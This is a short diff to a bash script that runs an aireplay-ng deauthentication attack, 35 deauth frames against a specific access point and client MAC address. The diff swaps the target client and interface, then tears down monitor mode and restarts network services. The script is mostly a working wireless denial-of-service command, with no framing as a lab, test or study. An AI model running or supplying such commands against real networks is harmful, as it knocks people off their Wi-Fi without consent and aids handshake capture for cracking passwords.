@@ -1,5 +1,6 @@
-aireplay-ng --deauth 35 -a A0:14:3D:A5:BF:13 -c BA:DE:AD:7D:BC:08 wlp2s0 
-ifconfig wlp2s0 down
-  iwconfig wlp2s0 mode managed
-  ifconfig wlp2s0 up
-  service network-manager start
+#!/bin/bash
+aireplay-ng --deauth 35 -a A0:14:3D:A5:BF:13 -c 00:CD:FE:9B:6A:90 wlp2s0mon
+airmon-ng stop wlp2s0mon
+service network-manager start
+systemctl restart networking
+service network-manager start
